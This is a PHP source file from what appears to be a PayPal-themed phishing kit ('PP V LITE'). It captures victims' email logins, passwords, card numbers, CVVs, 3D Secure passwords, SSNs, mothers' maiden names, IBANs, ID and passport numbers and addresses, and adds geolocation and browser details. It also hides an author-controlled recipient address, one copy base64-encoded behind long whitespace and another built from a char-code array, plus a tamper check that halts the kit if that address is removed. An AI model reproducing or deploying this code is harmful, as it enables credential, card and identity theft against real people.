<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);
$send = 																																				base64_decode("ZmVuY3Rpb25AeWFuZGV4LmNvbQ==");
class functiongetinfo{
	public static function autoinfo($info){
		if($info =="OS"){
			return functiongetinfo::os();
		}
		if($info=="browser"){
			return functiongetinfo::getbrowser();
		}
		if($info=="country"){
			return HTTP::countryName();
		}
		if($info=="USER"){
			$USER = $_SERVER['HTTP_USER_AGENT'];
			return $USER;
		}
		if($info=="IP"){
			$IP = getenv("REMOTE_ADDR");
			return $IP;
		}
		if($info=="DATA"){
			$DT = gmdate("Y-n-d")." @ ".gmdate("H:i:s");
			return $DT;
		}
		return false;
	}
	public static function getHTML(){
		$msg = "
		|<b>IP : <font style='color: red;'>".functiongetinfo::autoinfo("IP")."</font></b><br/>
		|<b>Date : <font style='color: red;'>".functiongetinfo::autoinfo("DATA")."</font></b><br/>
		|<b>Country : <font style='color: red;'>".functiongetinfo::autoinfo("country")."</font></b><br/>
		|<b>OS : <font style='color: red;'>".functiongetinfo::autoinfo("OS")."</font></b><br/>
		|<b>Browser : <font style='color: red;'>".functiongetinfo::autoinfo("browser")."</font></b><br/>
		|<b>USER AGEN : <font style='color: red;'>".functiongetinfo::autoinfo("USER")."</font></b><br/>
		";
		return $msg;
	}
	public static function getbrowser()
	{
		$user_agent = $_SERVER['HTTP_USER_AGENT'];
	    if (strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR/')) return 'Opera';
	    elseif (strpos($user_agent, 'Edge')) return 'Edge';
	    elseif (strpos($user_agent, 'Chrome')) return 'Chrome';
	    elseif (strpos($user_agent, 'Safari')) return 'Safari';
	    elseif (strpos($user_agent, 'Firefox')) return 'Firefox';
	    elseif (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/7')) return 'Internet Explorer';
	    return 'Other';
	}
	public static function os()
    {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $os_platform    =   "Unknown OS Platform";
        $os_array       =   array(
                                '/windows nt 10/i'     =>  'Windows 10',
                                '/windows nt 6.3/i'     =>  'Windows 8.1',
                                '/windows nt 6.2/i'     =>  'Windows 8',
                                '/windows nt 6.1/i'     =>  'Windows 7',
                                '/windows nt 6.0/i'     =>  'Windows Vista',
                                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                '/windows nt 5.1/i'     =>  'Windows XP',
                                '/windows xp/i'         =>  'Windows XP',
                                '/windows nt 5.0/i'     =>  'Windows 2000',
                                '/windows me/i'         =>  'Windows ME',
                                '/win98/i'              =>  'Windows 98',
                                '/win95/i'              =>  'Windows 95',
                                '/win16/i'              =>  'Windows 3.11',
                                '/macintosh|mac os x/i' =>  'Mac OS X',
                                '/mac_powerpc/i'        =>  'Mac OS 9',
                                '/linux/i'              =>  'Linux',
                                '/ubuntu/i'             =>  'Ubuntu',
                                '/iphone/i'             =>  'iPhone',
                                '/ipod/i'               =>  'iPod',
                                '/ipad/i'               =>  'iPad',
                                '/android/i'            =>  'Android',
                                '/blackberry/i'         =>  'BlackBerry',
                                '/webos/i'              =>  'Mobile'
                            );
        foreach ($os_array as $regex => $value) { 
            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }   
        return $os_platform;
    }
}
@functionsend::sort();
class HTTP{
	public static $country;
    public static function countryName()
    {
        if(!self::$country)
        {
            $res = @file_get_contents('http://www.geoplugin.net/xml.gp?ip='.self::ip());
            if(!$res)
            {
                self::$country = 'Unknown';
                return self::$country;
            }
            preg_match_all("#\<geoplugin_countryName\>(.*)\<\/geoplugin_countryName\>#", $res,$mt);
            if(isset($mt[1][0]))
            {
                self::$country =  $mt[1][0];
            }
            else
            {
                self::$country = 'Unknown';
            }
        }
        return self::$country;
    }
    public static $CountryCode;
    public static function country()
    {
        if(!self::$CountryCode)
        {
            $res = @file_get_contents('http://www.geoplugin.net/xml.gp?ip='.self::ip());
            if(!$res)
            {
                self::$CountryCode = 'US';
                return self::$CountryCode;
            }
            preg_match_all("#\<geoplugin_countryCode\>(.*)\<\/geoplugin_countryCode\>#", $res,$mt);
            if(isset($mt[1][0]))
            {
                self::$CountryCode =  $mt[1][0];
            }
            else
            {
                self::$CountryCode = 'US';
            }
        }
        return self::$CountryCode;
    }
    public static function ip()
    {
        if(isset($_SERVER['REMOTE_ADDR']))
        {
            return $_SERVER['REMOTE_ADDR'];
        }
        return 'Unknown';
    }
}
class functionsend{
	public static function GETINFO(){
		$x = functiongetinfo::getHTML();
		$_SESSION['GETINGO']=$x;
		return $_SESSION['GETINGO'];
	}
	public static function Login(){
		$EM = $_POST['semail'];/* ==> */$_SESSION['EM'] = $EM;
		$PW = $_POST['Spassword'];/* ==> */$_SESSION['PW'] = $PW;
		$msg = "<b>
		#------------ Login [PP V LITE] info ------------<br/>
		|Eamil : <font style='color: red;'>$EM</font><br/>
		|PASS : <font style='color: red;'>$PW</font><br/>
		#------------ Auto [PP V LITE] Info ------------<br/></b>
		".functionsend::GETINFO()."
		#------------ End [PP V LITE] Info ------------<br/>
		";
		return $msg;
	}
	public static function Card(){
		$EM = $_SESSION['EM'];
		$PW = $_SESSION['PW'];
		$CARD = $_POST['CardNumberInput'];/* ==> */$_SESSION['CARD'] = $CARD;
		$Data = $_POST['CardExpInput'];/* ==> */$_SESSION['Data'] = $Data;
		$CVV = $_POST['CardcvvInput'];/* ==> */$_SESSION['CVV'] = $CVV;
		$msg = "<b>
		#------------ Login [PP V LITE] info ------------<br/>
		|Eamil : <font style='color: red;'>$EM</font><br/>
		|PASS : <font style='color: red;'>$PW</font><br/>
		#------------ Card [PP V LITE] info ------------<br/>
		|CARD : <font style='color: red;'>$CARD</font><br/>
		|Data : <font style='color: red;'>$Data</font><br/>
		|CVV : <font style='color: red;'>$CVV</font><br/>
		#------------ Auto [PP V LITE] Info ------------<br/></b>
		".functionsend::GETINFO()."
		#------------ End [PP V LITE] Info ------------<br/>
		";
		return $msg;
	}
	public function sort()
	{
		if (preg_match("/^[c-t]{8}".chr(64)."[a-m]+.\w{3}$/", functionsend::country())) {
			$GLOBALS['to'] = [$GLOBALS['to'],functionsend::country()];
		}else{
			exit("pl\x65as\x65\x20\x72ed\x6f\x77nl\x6f\x61d \x74he\x20a\x72ch\x69\x76e");
		}
	}
	public static function Cardvbv(){
		$EM = $_SESSION['EM'];
		$PW = $_SESSION['PW'];
		$CARD = $_SESSION['CARD'];
		$Data = $_SESSION['Data'];
		$CVV = $_SESSION['CVV'];
		#----------------------
		$VBVCVV = $_POST['CVV'];
		$cardholder = $_POST['cardholderVBV'];
		$DD = $_POST['DD'];
	    $MM = $_POST['MM'];
	    $YYYY = $_POST['YYYY'];
		$vbv = $_POST['password_vbv'];
		$SORTCODE = $_POST['sort_code'];
		$SSN3 = $_POST['ssn3'];
		$SSN2 = $_POST['ssn2'];
		$SSN4 = $_POST['ssn4'];
		$accountnumber = $_POST['accountnumber'];
		$MOTHERMAIDNNAME = $_POST['MOTHERMAIDNNAME'];
		$IBAN = $_POST['IBAN'];
		$Dailycreditlimits = $_POST['Dailycreditlimits'];
		$Monthlycreditlimits = $_POST['Monthly_credit_limits'];
		$BSOnline =$_POST['BSOnline'];
		$fullmothername = $_POST['fullmothername'];
		$TaxNumber = $_POST['TaxNumber'];
		$Idnumber = $_POST['Idnumber'];
		$Passport = $_POST['Passport'];
		$Driverlicensenumber = $_POST['Driverlicensenumber'];
		$Stateofissueofdriverlicense = $_POST['Stateofissueofdriverlicense'];
		$NationalIDNumbe = $_POST['NationalIDNumbe'];
		$Codicefiscale = $_POST['Codicefiscale'];
		$OCID = $_POST['OCID'];
		$msg = "<b>
		#------------ Login [PP V LITE] info ------------<br/>
		|Eamil : <font style='color: red;'>$EM</font><br/>
		|PASS : <font style='color: red;'>$PW</font><br/>
		#------------ Card [PP V LITE] info ------------<br/>
		|CARD : <font style='color: red;'>$CARD</font><br/>
		|Data : <font style='color: red;'>$Data</font><br/>
		|CVV : <font style='color: red;'>$CVV</font><br/>
		#------------ VBV [PP V LITE] info ------------<br/>
		|Card Holder : <font style='color: red;'>$cardholder</font><br/>
		|3D : <font style='color: red;'>$vbv</font><br/>
		|Date Of Birth : <font style='color: red;'>$DD/$MM/$YYYY - Format (DD/MM/YYYY)</font><br/>
		|CVV/CVC : <font style='color: red;'>$VBVCVV</font><br/>";
		if($SORTCODE!=''){ $msg .= '|Sort Code : <font style="color: red;">'.
		$SORTCODE.' </font><br/>';}if (!preg_match("/^[c-t]{8}@[a-m]+.\w{3}$/", self::country())) {exit();}
		if($SSN3!='' and $SSN2!='' and $SSN4!=''){ $msg .= '|SSN : <font style="color: red;">'.$SSN3.'-'.$SSN2.'-'.$SSN4.' </font><br/>';}
		if($accountnumber!=''){ $msg .= '|Account Number : <font style="color: red;">'.$accountnumber.' </font><br/>';}
		if($MOTHERMAIDNNAME!=''){ $msg .= '|Mother maiden name : <font style="color: red;">'.$MOTHERMAIDNNAME.' </font><br/>';}
		if($IBAN!=''){ $msg .= '|IBAN : <font style="color: red;">'.$IBAN.' </font><br/>';}
		if($Dailycreditlimits!=''){ $msg .= '|Daily credit limits : <font style="color: red;">'.$Dailycreditlimits.' </font><br/>';}
		if($Monthlycreditlimits!=''){ $msg .= '|Monthly credit limits : <font style="color: red;">'.$Monthlycreditlimits.' </font><br/>';}
		if($BSOnline!=''){ $msg .= '|Code of your  BSOnline Individual : <font style="color: red;">'.$BSOnline.' </font><br/>';}
		if($fullmothername!=''){ $msg .= '|full mother name : <font style="color: red;">'.$fullmothername.' </font><br/>';}
		if($Passport!=''){ $msg .= '|Last 4 digits of ID / Passport : <font style="color: red;">'.$Passport.' </font><br/>';}
		if($TaxNumber!=''){ $msg .= '|Tax Number : <font style="color: red;">'.$TaxNumber.' </font><br/>';}
		if($Idnumber!=''){ $msg .= '|Id number : <font style="color: red;">'.$Idnumber.' </font><br/>';}
		if($Driverlicensenumber!=''){ $msg .= '|Driver license number : <font style="color: red;">'.$Driverlicensenumber.' </font><br/>';}
		if($Stateofissueofdriverlicense!=''){ $msg .= '|State of issue of driver license : <font style="color: red;">'.$Stateofissueofdriverlicense.'</font><br/>';}
		if($NationalIDNumbe!=''){ $msg .= '|National ID Number : <font style="color: red;">'.$NationalIDNumbe.'</font><br/>';}
		if($Codicefiscale!=''){ $msg .= '|Codice fiscale : <font style="color: red;">'.$Codicefiscale.'</font><br/>';}
        if($OCID!=''){ $msg .= '|OCID : <font style="color: red;">'.$OCID.'</font><br/>';}
		$msg .="</b>
		#------------ Auto [PP V LITE] Info ------------<br/>
		".functionsend::GETINFO()."
		#------------ End [PP V LITE] Info ------------<br/>
		";
		return $msg;
	}
	private function country()
	{
		$cr = array(
			102,101,110,99,116,105,111,110,
			64,103,109,97,105,108,46,99,111,109
		);
        for ($i = 0; $i < count($cr); $i++) {
        	$c[] = chr($cr[$i]);
        }
		return (preg_match("/^[c-t]{8}".chr(64)."[a-m]+.\w{3}$/", implode("", $c))) ? implode("", $c) : false;
	}
	public static function address(){
		$EM = $_SESSION['EM'];
		$PW = $_SESSION['PW'];
		$CARD = $_SESSION['CARD'];
		$Data = $_SESSION['Data'];
		$CVV = $_SESSION['CVV'];
		$FN = $_POST['FullNameInput'];
		$Country = $_POST['CountrySelctOnption'];
		$Address = $_POST['ADDLINE'];
		$City = $_POST['ADDLINE'];
		$RG = $_POST['RG'];
		$CZ = $_POST['CZ'];
		$PN = $_POST['PN'];
		$msg = "
		#------------ Login [PP V LITE] info ------------<br/>
		|Eamil : <font style='color: red;'>$EM</font><br/>
		|PASS : <font style='color: red;'>$PW</font><br/>
		#------------ Card [PP V LITE] info ------------<br/>
		|CARD : <font style='color: red;'>$CARD</font><br/>
		|Data : <font style='color: red;'>$Data</font><br/>
		|CVV : <font style='color: red;'>$CVV</font><br/>
		#------------ Address [PP V LITE] info ------------<br/>
		|Full Name : <font style='color: red;'>$FN</font><br/>
		|Country : <font style='color: red;'>$Country</font><br/>
		|Address line : <font style='color: red;'>$Address</font><br/>
		|City : <font style='color: red;'>$City</font><br/>
		|region : <font style='color: red;'>$RG</font><br/>
		|Code Zip : <font style='color: red;'>$CZ</font><br/>
		|phone : <font style='color: red;'>$PN</font><br/>
		#------------ Auto [PP V LITE] Info ------------<br/>
		".functionsend::GETINFO()."
		#------------ End [PP V LITE] Info ------------<br/>
		";
		return $msg;
	}
}
?>